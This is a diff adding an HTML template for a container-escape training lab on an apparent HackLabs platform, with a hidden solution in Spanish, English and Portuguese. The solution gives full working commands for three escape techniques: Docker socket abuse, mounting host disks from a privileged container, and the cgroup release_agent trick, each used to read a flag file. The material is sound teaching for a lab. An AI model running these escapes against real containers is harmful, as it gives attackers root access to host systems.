@@ -1,0 +1,350 @@
+{% extends "base.html" %}
+{% block title %}H11 – Container Escape – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  {% with messages = get_flashed_messages(with_categories=true) %}
+    {% if messages %}{% for category, msg in messages %}
+      <div class="alert-{{ category if category in ['success','warning','error'] else 'success' }} mb-4 text-sm font-mono">{{ msg }}</div>
+    {% endfor %}{% endif %}
+  {% endwith %}
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3">Descripcion del lab</h2>
+    <p class="text-sm text-gray-300 mb-3">Este laboratorio usa un escenario Docker-in-Docker aislado para practicar Container Escape sin depender del contenedor principal de HackLabs.</p>
+    <p class="text-sm text-gray-300 mb-4">Objetivo: entrar al contenedor victima, validar acceso al socket Docker y ejecutar tecnicas de escape sobre el host del escenario ad-hoc.</p>
+
+    <div class="text-xs text-gray-400 mb-2">Inicio rapido</div>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># 1) Levanta el entorno ad-hoc aislado (desde la carpeta del proyecto)
+docker compose -f docker-compose.docker-escape.yml up -d --build
+
+# 2) Entra al contenedor victima del lab
+docker exec -it hacklabs-escape-victim sh</pre>
+  </div>
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-4" data-i18n="container_recon">Reconocimiento del contenedor victima</h2>
+
+    <p class="text-sm text-gray-300 mb-3">Ejecuta estas comprobaciones dentro de <code>hacklabs-escape-victim</code> para confirmar que el entorno de explotacion esta listo:</p>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># 1) Confirmar contenedor
+ls /.dockerenv &amp;&amp; echo "DENTRO del contenedor"
+
+# 2) Confirmar socket Docker
+ls -la /var/run/docker.sock
+
+# 3) Confirmar daemon Docker
+curl --unix-socket /var/run/docker.sock http://localhost/_ping
+
+# 4) Confirmar CLI Docker
+which docker</pre>
+    <p class="text-xs text-gray-400 mt-2">Nota: el host accesible tras el escape es el del escenario ad-hoc aislado, no el sistema operativo principal que ejecuta HackLabs.</p>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Prerequisito — Escenario Ad-Hoc aislado (recomendado)</h3>
+    <p>Si el contenedor principal no tiene <code>/var/run/docker.sock</code> o <code>docker</code>, usa este escenario aislado con Docker-in-Docker. No toca el entorno principal de HackLabs.</p>
+    <pre># 1) Levanta el entorno ad-hoc aislado (desde la carpeta del proyecto):
+  docker compose -f docker-compose.docker-escape.yml up -d --build
+
+  # 2) Entra al contenedor víctima del lab:
+  docker exec -it hacklabs-escape-victim sh</pre>
+
+    <h3>Easy — Docker Socket Escape</h3>
+    <p>El socket de Docker está montado dentro del contenedor. Cualquier proceso con acceso al socket puede lanzar contenedores privilegiados en el host.</p>
+    <ol>
+      <li>Verifica que estás en un contenedor:
+        <pre># Método fiable (funciona en cgroupsv1 y cgroupsv2):
+ls /.dockerenv &amp;&amp; echo "DENTRO del contenedor" || echo "no detectado"
+
+# Alternativa (solo cgroupsv1 — en kernels &gt;=6.x puede devolver vacío):
+cat /proc/1/cgroup | grep -i docker</pre>
+      </li>
+      <li>Verifica que el socket existe y que el daemon responde:
+        <pre>ls -la /var/run/docker.sock
+    curl --unix-socket /var/run/docker.sock http://localhost/_ping
+    # Socket presente + respuesta OK → daemon accesible</pre>
+      </li>
+      <li>Comprueba si el binario docker está disponible:
+        <pre>which docker
+# Si no está, usa la API REST via curl (ver paso alternativo)</pre>
+      </li>
+      <li>Escapa montando el filesystem del host en un nuevo contenedor:
+        <pre>docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh</pre>
+      </li>
+      <li>Alternativa sin binario docker (API REST):
+        <pre># Comprueba conectividad con el daemon:
+curl --unix-socket /var/run/docker.sock http://localhost/_ping
+
+# Lista imágenes disponibles:
+curl --unix-socket /var/run/docker.sock http://localhost/images/json | python3 -m json.tool
+
+# Crea un contenedor privilegiado con el host montado:
+curl --unix-socket /var/run/docker.sock -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"alpine","Cmd":["chroot","/hostfs","sh","-c","cat /root/root.txt"],"Binds":["/:/hostfs"]}' \
+  http://localhost/containers/create?name=escape
+
+# Inicia el contenedor y recoge los logs:
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape/start
+curl --unix-socket /var/run/docker.sock http://localhost/containers/escape/logs?stdout=1</pre>
+      </li>
+      <li>Desde dentro del chroot tienes acceso completo al host del escenario aislado. Lee la flag del lab:
+        <pre>cat /root/root.txt</pre>
+      </li>
+    </ol>
+
+    <h3>Medium — Privileged Container Escape</h3>
+    <p>El contenedor corre en modo privileged. Tiene acceso a todos los dispositivos del host.</p>
+    <ol>
+      <li>Comprueba las capacidades efectivas:
+        <pre>cat /proc/self/status | grep CapEff
+# Si CapEff != 0000000000000000 → privileged</pre>
+      </li>
+      <li>Lista los discos del host y monta el disco principal:
+        <pre>fdisk -l
+mkdir /tmp/hostdisk
+mount /dev/sda1 /tmp/hostdisk
+# Si falla sda1, prueba con sda, vda, xvda...</pre>
+      </li>
+      <li>Haz chroot al disco del host para obtener una shell con acceso completo:
+        <pre>chroot /tmp/hostdisk</pre>
+      </li>
+      <li>Lee la flag:
+        <pre>cat /root/root.txt</pre>
+      </li>
+    </ol>
+
+    <h3>Hard — Cgroup release_agent abuse</h3>
+    <p>Técnica avanzada que usa cgroups para ejecutar comandos en el host sin montar discos.</p>
+    <ol>
+      <li>Crea un cgroup y configura el release_agent para apuntar a un script en el host:
+        <pre>mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 &gt; /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent</pre>
+      </li>
+      <li>Crea el script que se ejecutará en el host:
+        <pre>echo '#!/bin/sh' &gt; /cmd
+echo "cat /root/root.txt &gt; ${host_path}/output" &gt;&gt; /cmd
+chmod a+x /cmd</pre>
+      </li>
+      <li>Dispara la ejecución añadiendo un proceso al cgroup y matándolo:
+        <pre>sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"
+sleep 1
+cat /output</pre>
+      </li>
+      <li>La flag aparecerá en <code>/output</code>:
+        <pre>cat /output</pre>
+      </li>
+    </ol>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">docker CLI</span> <span class="tools-badge">curl (API Docker)</span> <span class="tools-badge">fdisk/mount</span> <span class="tools-badge">cgroups</span> <span class="tools-badge">Deepce</span> <span class="tools-badge">CDK</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Prerequisite — Isolated Ad-Hoc scenario (recommended)</h3>
+    <p>If the main HackLabs container does not expose <code>/var/run/docker.sock</code> or lacks the <code>docker</code> CLI, use this isolated Docker-in-Docker setup.</p>
+    <pre># 1) Start the isolated ad-hoc stack (from project root):
+  docker compose -f docker-compose.docker-escape.yml up -d --build
+
+  # 2) Enter the victim container:
+  docker exec -it hacklabs-escape-victim sh</pre>
+
+    <h3>Easy — Docker Socket Escape</h3>
+    <p>The Docker socket is mounted inside the container. Any process with socket access can launch privileged containers on the host.</p>
+    <ol>
+      <li>Verify you are inside a container:
+        <pre># Reliable method (works on cgroupsv1 and cgroupsv2):
+ls /.dockerenv &amp;&amp; echo "INSIDE container" || echo "not detected"
+
+# Alternative (cgroupsv1 only — on kernels &gt;=6.x may return empty):
+cat /proc/1/cgroup | grep -i docker</pre>
+      </li>
+      <li>Verify the socket exists and the daemon responds:
+        <pre>ls -la /var/run/docker.sock
+    curl --unix-socket /var/run/docker.sock http://localhost/_ping
+    # Socket present + OK response → daemon reachable</pre>
+      </li>
+      <li>Check if the docker binary is available:
+        <pre>which docker
+# If not available, use the REST API via curl (see alternative step)</pre>
+      </li>
+      <li>Escape by mounting the host filesystem into a new container:
+        <pre>docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh</pre>
+      </li>
+      <li>Alternative without docker binary (REST API):
+        <pre># Verify daemon connectivity:
+curl --unix-socket /var/run/docker.sock http://localhost/_ping
+
+# List available images:
+curl --unix-socket /var/run/docker.sock http://localhost/images/json | python3 -m json.tool
+
+# Create a privileged container with host mounted:
+curl --unix-socket /var/run/docker.sock -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"alpine","Cmd":["chroot","/hostfs","sh","-c","cat /root/root.txt"],"Binds":["/:/hostfs"]}' \
+  http://localhost/containers/create?name=escape
+
+# Start the container and collect logs:
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape/start
+curl --unix-socket /var/run/docker.sock http://localhost/containers/escape/logs?stdout=1</pre>
+      </li>
+      <li>Inside the chroot you have full access to the isolated scenario host. Read the lab flag:
+        <pre>cat /root/root.txt</pre>
+      </li>
+    </ol>
+
+    <h3>Medium — Privileged Container Escape</h3>
+    <p>The container runs in privileged mode. It has access to all host devices.</p>
+    <ol>
+      <li>Check effective capabilities:
+        <pre>cat /proc/self/status | grep CapEff
+# If CapEff != 0000000000000000 → privileged</pre>
+      </li>
+      <li>List host disks and mount the main disk:
+        <pre>fdisk -l
+mkdir /tmp/hostdisk
+mount /dev/sda1 /tmp/hostdisk
+# If sda1 fails, try sda, vda, xvda...</pre>
+      </li>
+      <li>Chroot into the host disk to get a shell with full access:
+        <pre>chroot /tmp/hostdisk</pre>
+      </li>
+      <li>Read the flag:
+        <pre>cat /root/root.txt</pre>
+      </li>
+    </ol>
+
+    <h3>Hard — Cgroup release_agent abuse</h3>
+    <p>Advanced technique using cgroups to execute commands on the host without mounting disks.</p>
+    <ol>
+      <li>Create a cgroup and configure the release_agent to point to a script on the host:
+        <pre>mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 &gt; /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent</pre>
+      </li>
+      <li>Create the script that will run on the host:
+        <pre>echo '#!/bin/sh' &gt; /cmd
+echo "cat /root/root.txt &gt; ${host_path}/output" &gt;&gt; /cmd
+chmod a+x /cmd</pre>
+      </li>
+      <li>Trigger execution by adding a process to the cgroup and killing it:
+        <pre>sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"
+sleep 1
+cat /output</pre>
+      </li>
+      <li>The flag will appear in <code>/output</code>:
+        <pre>cat /output</pre>
+      </li>
+    </ol>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">docker CLI</span> <span class="tools-badge">curl (Docker API)</span> <span class="tools-badge">fdisk/mount</span> <span class="tools-badge">cgroups</span> <span class="tools-badge">Deepce</span> <span class="tools-badge">CDK</span></div>
+  </div>
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>Pré-requisito — Cenário Ad-Hoc isolado (recomendado)</h3>
+    <p>Se o container principal do HackLabs não expuser o <code>/var/run/docker.sock</code> ou não possuir a CLI <code>docker</code>, utilize este ambiente isolado com Docker-in-Docker. Ele não interfere no ambiente principal do HackLabs.</p>
+    <pre># 1) Inicie o ambiente ad-hoc isolado (a partir da raiz do projeto):
+docker compose -f docker-compose.docker-escape.yml up -d --build
+
+# 2) Acesse o container vítima do laboratório:
+docker exec -it hacklabs-escape-victim sh</pre>
+
+    <h3>Fácil — Fuga via Docker Socket (Docker Socket Escape)</h3>
+    <p>O socket do Docker está montado dentro do container. Qualquer processo com acesso a esse socket pode iniciar containers com privilégios elevados no host.</p>
+    <ol>
+      <li>Verifique se você está dentro de um container:
+        <pre># Método confiável (funciona em cgroupsv1 e cgroupsv2):
+ls /.dockerenv &amp;&amp; echo "DENTRO do container" || echo "não detectado"
+
+# Alternativa (apenas cgroupsv1 — em kernels &gt;=6.x pode retornar vazio):
+cat /proc/1/cgroup | grep -i docker</pre>
+      </li>
+      <li>Verifique se o socket existe e se o daemon responde:
+        <pre>ls -la /var/run/docker.sock
+curl --unix-socket /var/run/docker.sock http://localhost/_ping
+# Socket presente + resposta OK → daemon alcançável</pre>
+      </li>
+      <li>Verifique se o binário docker está disponível:
+        <pre>which docker
+# Se não estiver disponível, use a API REST via curl (veja passo alternativo)</pre>
+      </li>
+      <li>Escape montando o sistema de arquivos do host em um novo container:
+        <pre>docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh</pre>
+      </li>
+      <li>Alternativa sem o binário docker (API REST):
+        <pre># Verificar conectividade com o daemon:
+curl --unix-socket /var/run/docker.sock http://localhost/_ping
+
+# Listar imagens disponíveis:
+curl --unix-socket /var/run/docker.sock http://localhost/images/json | python3 -m json.tool
+
+# Criar um container privilegiado com o host montado:
+curl --unix-socket /var/run/docker.sock -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"alpine","Cmd":["chroot","/hostfs","sh","-c","cat /root/root.txt"],"Binds":["/:/hostfs"]}' \
+  http://localhost/containers/create?name=escape
+
+# Iniciar o container e coletar logs:
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape/start
+curl --unix-socket /var/run/docker.sock http://localhost/containers/escape/logs?stdout=1</pre>
+      </li>
+      <li>De dentro do chroot você tem acesso total ao host do cenário isolado. Leia a flag do laboratório:
+        <pre>cat /root/root.txt</pre>
+      </li>
+    </ol>
+
+    <h3>Médio — Fuga de Container Privilegiado (Privileged Container Escape)</h3>
+    <p>O container executa em modo privilegiado (privileged). Ele possui acesso a todos os dispositivos de bloco do host.</p>
+    <ol>
+      <li>Verifique as capacidades efetivas:
+        <pre>cat /proc/self/status | grep CapEff
+# Se CapEff != 0000000000000000 → privilegiado</pre>
+      </li>
+      <li>Liste os discos do host e monte o disco principal:
+        <pre>fdisk -l
+mkdir /tmp/hostdisk
+mount /dev/sda1 /tmp/hostdisk
+# Se sda1 falhar, tente sda, vda, xvda...</pre>
+      </li>
+      <li>Faça chroot para o disco montado do host para obter uma shell com acesso irrestrito:
+        <pre>chroot /tmp/hostdisk</pre>
+      </li>
+      <li>Leia a flag:
+        <pre>cat /root/root.txt</pre>
+      </li>
+    </ol>
+
+    <h3>Difícil — Abuso de cgroup release_agent</h3>
+    <p>Técnica avançada que utiliza cgroups para executar comandos diretamente no host sem necessidade de montar discos.</p>
+    <ol>
+      <li>Crie um cgroup e configure o release_agent para apontar para um script no host:
+        <pre>mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 &gt; /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent</pre>
+      </li>
+      <li>Crie o script que será executado no host:
+        <pre>echo '#!/bin/sh' &gt; /cmd
+echo "cat /root/root.txt &gt; ${host_path}/output" &gt;&gt; /cmd
+chmod a+x /cmd</pre>
+      </li>
+      <li>Dispare a execução adicionando um processo ao cgroup e finalizando-o:
+        <pre>sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"
+sleep 1
+cat /output</pre>
+      </li>
+      <li>A flag será exibida em <code>/output</code>:
+        <pre>cat /output</pre>
+      </li>
+    </ol>
+
+    <h3>Ferramentas</h3>
+    <div><span class="tools-badge">docker CLI</span> <span class="tools-badge">curl (Docker API)</span> <span class="tools-badge">fdisk/mount</span> <span class="tools-badge">cgroups</span> <span class="tools-badge">Deepce</span> <span class="tools-badge">CDK</span></div>
+  </div>
+</div>
+{% endblock %}
